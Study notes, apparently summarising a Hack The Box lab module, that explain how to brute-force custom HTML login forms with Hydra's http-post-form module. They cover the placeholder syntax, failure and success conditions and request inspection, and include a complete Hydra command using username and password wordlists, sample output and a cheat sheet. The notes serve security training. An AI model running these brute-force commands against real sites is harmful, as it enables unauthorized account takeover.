![Image](https://images.openai.com/static-rsc-4/2RK1l8ahc4RpTAvfpnASj8Par3eyfHUF4OX9ANJcj7XkqsInlHURKmFntIxGnMjTpxd7Ulg7bWL6qK30lwjMbdWSinh6TZF2rYO50fJXe60sHtkHJ6wWRQR8TVU3Hc3MG_YTtS7OwP7RdZAwoGb_8Iw2lrH3ObZ9poDrpLRUcJca-yyQHTwnsEkt-efiyeKj?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/VrNGcp5s49-LgtPdd0LHgqWZkYe9xo6MftBKaFhoIZHUcYzpgG9juLkOJEedYdB7CGFgSfzDROF6-VFmEdCm1Ciul9wUbv387Yc7Rp79cnn0XEh2geWFBy1CUdLhWVacO5W6cTEgUptWNqNmZpYXKzVyO-Z-8tGAyvGI6gISbHjLe90MGmhZin5Ola2r_HW2?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/RZDb8QCc1fEK92vukbW9xoYCN9v3M-x8QE5nuezt3jXjYwq8I8IscGOy66DK6HeA6wLJKeOi4ukuz-wuE7wB_5xdQ3oNkvaakmKZnwcRuQa6p3N5H03mKvjOMlRl9ongsnEu3dSufOf-4NyvcHZtOSGRaqWmdrHyYYQakYYG6tt_jJqtqDjsZtAeEyfOZ0zi?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/wxroQbXQGgPCpKsjfZH8lIEB1ntvnHOejFVWe83o5RN5pNACpOxzetzB4Yc5mqsVi5JMyTAcZjASOCrwtgsK2ufB1jYiegzKjXI6azZxGuNlrLJbDAHFCwzAQFVcd2mWDWsYx6REUAt1XRW8yRaYjALkd2Xg4tBNJCZpEDkSFGuxJSImVlD3DfQpn2eUCaj7?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/6lALhe-SS4n8iiIppwoAqlfZJtBHuBOPJ-8M818r17eKKc-dxV3qgRbmqoccGURdTWdPSVoMUBiIZA8mcX4ahBuojEyosiWrsABMb-fs-yFBYS7KY-6KuZcqkt-JfznTJfyA9DwpIV0nU8B1H7kJGtdWps93p-h23MqsUkbtcNx3YxQHHTMAs2D_Am3O2k4a?purpose=fullsize)

---

# 1. What Is a Login Form?

A custom login form is usually an HTML form containing:

- Username field
    
- Password field
    
- Submit button
    

A simple example from the module is:

```html
<form action="/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username"><br><br>

  <label for="password">Password:</label>
  <input type="password" id="password" name="password"><br><br>

  <input type="submit" value="Submit">
</form>
```

The important information is:

```text
action="/login"
method="post"
name="username"
name="password"
```

These determine **where** the credentials go and **what the parameters are called**.

---

# 2. What Happens When You Submit the Form?

The browser converts the form information into an HTTP request.

For the example in the module:

```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

So the basic flow is:

```text
User enters credentials
        ↓
HTML form
        ↓
Browser creates POST request
        ↓
/login endpoint
        ↓
Server processes credentials
        ↓
Success / Failure
```

The POST body contains the username and password as **key-value pairs**.

---

# 3. GET vs POST

This distinction is important for Hydra.

### GET

```text
GET /something
```

The request is primarily asking the server for a resource.

### POST

```text
POST /login
```

The request sends data to the server.

A login form commonly uses:

```text
POST + form data
```

For example:

```text
username=john&password=secret123
```

---

# 4. `application/x-www-form-urlencoded`

The example uses:

```http
Content-Type: application/x-www-form-urlencoded
```

This means the form data is encoded in a URL-style key-value format:

```text
username=john&password=secret123
```

Think of it as:

```text
FIELD        VALUE
──────       ─────
username  →  john
password  →  secret123
```

The browser can also submit forms using other formats such as `multipart/form-data`.

---

# 5. Hydra's `http-post-form`

This is the **main tool concept in this section**.

Hydra has a module specifically designed for HTTP login forms:

```text
http-post-form
```

It allows Hydra to:

1. Take usernames from a list
    
2. Take passwords from a list
    
3. Insert them into the form parameters
    
4. Send POST requests
    
5. Examine the response
    
6. Determine whether the credentials worked
    

### Mental model

```text
Username List
      +
Password List
      ↓
    Hydra
      ↓
username=^USER^
password=^PASS^
      ↓
HTTP POST
      ↓
Login Form
      ↓
Analyze Response
```

---

# 6. Basic `http-post-form` Syntax ⭐⭐⭐

The general structure is:

```bash
hydra [options] target http-post-form "path:params:condition_string"
```

There are **three major components** inside the quoted section:

```text
"path : params : condition"
```

### Example

```text
"/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

Break it down:

```text
/                              → Path
username=^USER^&password=^PASS^ → Parameters
F=Invalid credentials          → Failure condition
```

---

# 7. `^USER^` and `^PASS^`

These are Hydra's placeholders.

### `^USER^`

Hydra replaces this with the current username.

### `^PASS^`

Hydra replaces this with the current password.

For example:

```text
username=^USER^&password=^PASS^
```

could become:

```text
username=admin&password=password123
```

on one attempt.

On another attempt:

```text
username=admin&password=qwerty
```

And so on.

### ⭐ Remember

```text
^USER^ → username from Hydra
^PASS^ → password from Hydra
```

---

# 8. The Condition String ⭐⭐⭐

This is probably the **most important new concept** in this section.

Hydra needs to know:

> **How do I tell whether the login worked?**

It can use either:

- A **failure condition** `F=`
    
- A **success condition** `S=`
    

---

# 9. Failure Condition — `F=`

Suppose the website responds to incorrect credentials with:

```text
Invalid credentials
```

You can tell Hydra:

```text
F=Invalid credentials
```

Example:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

Hydra then interprets:

```text
Response contains "Invalid credentials"
            ↓
          FAILURE
            ↓
      Try next candidate
```

---

# 10. Success Condition — `S=`

Sometimes the website doesn't give you a convenient failure message.

Instead, a successful login might produce something distinctive.

For example:

```text
HTTP 302 redirect
```

You can use:

```text
S=302
```

Example:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

Hydra treats the `302` response as evidence of successful authentication.

---

# 11. Success Based on Page Content

A successful login might instead display:

```text
Dashboard
```

Then you can use:

```text
S=Dashboard
```

Example:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

Hydra considers the attempt successful if the response contains that text.

---

# 12. Failure vs Success Conditions

|Condition|Meaning|
|---|---|
|`F=Invalid credentials`|Treat response containing this text as failure|
|`S=302`|Treat HTTP 302 as success|
|`S=Dashboard`|Treat response containing `Dashboard` as success|

### Easy memory trick

```text
F = FAILURE
S = SUCCESS
```

---

# 13. Why Finding the Correct Condition Is Critical

Imagine the real failure response is:

```text
Login failed
```

but you tell Hydra:

```text
F=Invalid credentials
```

Hydra may not recognize failed attempts correctly.

This can produce misleading results.

Therefore:

> **You must understand the application's response before constructing the Hydra command.**

The module explicitly emphasizes gathering information about the form's inner workings before using Hydra.

---

# 14. Manual Inspection

One way to understand a login form is to inspect its HTML.

The module's example:

```html
<form method="POST">
    <h2>Login</h2>

    <label for="username">Username:</label>
    <input type="text" id="username" name="username">

    <label for="password">Password:</label>
    <input type="password" id="password" name="password">

    <input type="submit" value="Login">
</form>
```

From this, we learn:

```text
Method → POST
Username parameter → username
Password parameter → password
```

---

# 15. What You Need to Find

Before constructing the Hydra command, identify:

### 1. HTTP method

Example:

```text
POST
```

### 2. Path

Example:

```text
/
```

or:

```text
/login
```

### 3. Username parameter

Example:

```text
username
```

### 4. Password parameter

Example:

```text
password
```

### 5. Failure/success indicator

Example:

```text
Invalid credentials
```

or:

```text
302
```

---

# 16. Browser Developer Tools 🔎

Another method is using your browser's Developer Tools.

Open them with:

```text
F12
```

Then go to:

```text
Network
```

Submit a test login.

The browser will show the request generated by the form.

You can inspect:

- Request URL
    
- HTTP method
    
- Form data
    
- Headers
    
- Response
    
- Status code
    

---

# 17. Why the Network Tab Is So Useful

Suppose you submit:

```text
Username: test
Password: test123
```

The Network tab might reveal:

```http
POST / HTTP/1.1

username=test&password=test123
```

Now you know exactly what Hydra needs to reproduce.

```text
Path:
/

Username:
username

Password:
password
```

This is much more reliable than guessing parameter names.

---

# 18. Proxy Interception

For more complicated applications, the module mentions tools such as:

- **Burp Suite**
    
- **OWASP ZAP**
    

These can intercept HTTP traffic and allow you to inspect the request in detail.

Conceptually:

```text
Browser
   ↓
Proxy
   ↓
Web Application
```

The proxy lets you inspect:

```text
POST request
Headers
Parameters
Cookies
Response
Status code
```

---

# 19. Constructing the `params` String

Once you understand the request, you construct the parameters portion.

The module's example discovers:

```text
Path:
/

Username field:
username

Password field:
password

Failure message:
Invalid credentials
```

Therefore:

```text
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

---

# 20. Breaking That String Apart

This:

```text
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

contains:

### Part 1

```text
/
```

The path.

### Part 2

```text
username=^USER^&password=^PASS^
```

The form parameters.

### Part 3

```text
F=Invalid credentials
```

The failure condition.

So:

```text
PATH
  :
PARAMETERS
  :
CONDITION
```

---

# 21. The Complete HTB Command

The module provides:

```bash
hydra -L top-usernames-shortlist.txt \
-P 2023-200_most_used_passwords.txt \
-f IP -s 5000 \
http-post-form \
"/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

This is an **HTB lab example**, so the `IP` and port refer to the authorized target instance.

---

# 22. Command Breakdown

## `-L`

```text
-L top-usernames-shortlist.txt
```

Use a list of usernames.

---

## `-P`

```text
-P 2023-200_most_used_passwords.txt
```

Use a password list.

---

## `-f`

```text
-f
```

Stop after finding a valid credential pair.

---

## `-s 5000`

```text
-s 5000
```

Use port 5000.

---

## `http-post-form`

Use Hydra's module for POST-based login forms.

---

## Final string

```text
"/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

Defines:

```text
Path → /
Username field → username
Password field → password
Failure indicator → Invalid credentials
```

---

# 23. Understanding the Attack Logic

Suppose the wordlists contain:

```text
Users:
admin
root
user
```

and:

```text
Passwords:
password
123456
welcome
```

Hydra effectively tests combinations such as:

```text
admin + password
admin + 123456
admin + welcome

root + password
root + 123456
root + welcome

user + password
...
```

For every request:

```text
POST /
username=^USER^
password=^PASS^
```

Hydra checks the response.

---

# 24. Failure Flow

```text
Candidate credentials
        ↓
POST request
        ↓
Server response
        ↓
Contains "Invalid credentials"?
        │
       YES
        ↓
     FAILURE
        ↓
Next candidate
```

---

# 25. Success Flow

If the response **doesn't trigger the configured failure condition**:

```text
Candidate credentials
        ↓
POST request
        ↓
Server response
        ↓
"Invalid credentials" present?
        │
       NO
        ↓
Potential SUCCESS
        ↓
Hydra reports valid pair
```

The module specifically notes that when using the failure condition, a response that doesn't trigger that failure message can be flagged as a potential success.

---

# 26. Understanding the Hydra Output

The example reports:

```text
[DATA] max 16 tasks per 1 server, overall 16 tasks,
3400 login tries (l:17/p:200)
```

This tells us:

```text
17 usernames
×
200 passwords
=
3400 combinations
```

### ⭐ Important mathematics

[  
17 \times 200 = 3400  
]

This directly connects to the search-space concepts from your earlier notes.

---

# 27. Attack Finished

The example then reports:

```text
[STATUS] attack finished for IP (valid pair found)
```

followed by:

```text
1 of 1 target successfully completed, 1 valid password found
```

The important lesson isn't just the output.

It confirms that Hydra successfully:

```text
Read wordlists
      ↓
Generated credential combinations
      ↓
Sent POST requests
      ↓
Analyzed responses
      ↓
Identified a valid pair
```

---

# 28. Hidden Fields and CSRF Tokens ⚠️

Real login forms can be more complicated.

A form may contain additional fields such as:

```html
<input type="hidden" name="csrf_token" value="...">
```

These may need to be included in the request.

The module explicitly notes that additional fields or tokens, including **CSRF tokens**, may need to be included in the parameters string.

### Why this matters

A simplistic request:

```text
username=admin&password=test
```

may not be enough if the real application expects:

```text
username=admin
password=test
csrf_token=...
```

---

# 29. Why Manual Inspection Comes First

The workflow should be:

```text
             Login Form
                  ↓
            Inspect HTML
                  ↓
          Inspect Network
                  ↓
        Understand POST request
                  ↓
        Identify parameters
                  ↓
       Identify success/failure
                  ↓
          Build Hydra syntax
```

### ⭐ Don't start with Hydra blindly.

First understand the application.

---

# 30. Basic Auth vs Login Forms

This connects directly to the previous section.

|Basic HTTP Auth|Custom Login Form|
|---|---|
|Credentials in `Authorization` header|Credentials in POST body|
|Uses Base64 encoding|Usually form encoding|
|Hydra module: `http-get` in the lab|Hydra module: `http-post-form`|
|Server challenges with `401`|Application determines login response|
|Relatively standardized|Can vary significantly|

### Memory trick

```text
Basic Auth
→ Authorization header

Login Form
→ POST body
```

---

# 31. 🔥 Most Important Things to Memorize

### Login Form

> An HTML form containing input fields that sends authentication data to a server.

### POST

> Sends form data to the server in the request body.

### `http-post-form`

> Hydra module designed to automate testing of HTTP POST login forms.

### `^USER^`

> Hydra username placeholder.

### `^PASS^`

> Hydra password placeholder.

### `F=`

> Failure condition.

### `S=`

> Success condition.

### Developer Tools

> Use the **Network** tab to inspect the actual login request.

### Proxy

> Burp Suite / OWASP ZAP can intercept and inspect HTTP requests.

---

# 32. 🧠 Hydra `http-post-form` Cheat Sheet

### General structure

```bash
hydra [options] TARGET http-post-form "PATH:PARAMS:CONDITION"
```

### Failure-based example

```bash
hydra ... http-post-form \
"/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

### Success-status example

```bash
hydra ... http-post-form \
"/login:username=^USER^&password=^PASS^:S=302"
```

### Success-content example

```bash
hydra ... http-post-form \
"/login:username=^USER^&password=^PASS^:S=Dashboard"
```

---

# 33. 🎯 Final Mental Model

```text
                    LOGIN FORM
                        │
                        ↓
                  HTML Structure
                        │
               ┌────────┴────────┐
               ↓                 ↓
          Username            Password
           field                field
               │                 │
               └────────┬────────┘
                        ↓
                    POST Request
                        │
                        ↓
                 Developer Tools
                    / Proxy
                        │
                        ↓
             Identify exact parameters
                        │
                        ↓
                  Build Hydra:
                        │
       ┌────────────────┼────────────────┐
       ↓                ↓                ↓
      PATH           PARAMS          CONDITION
       │                │                │
       /        ^USER^ / ^PASS^     F= / S=
       │                │                │
       └────────────────┼────────────────┘
                        ↓
                  http-post-form
                        ↓
                Authorized Testing
                        ↓
                 Analyze Response
                        ↓
                  Valid Credentials
```

### 🔑 One-line takeaway

> **For a custom web login form, the critical skill is not simply knowing the Hydra command—it is accurately identifying the POST path, parameter names, and success/failure response, then expressing those details in Hydra's `http-post-form` syntax.**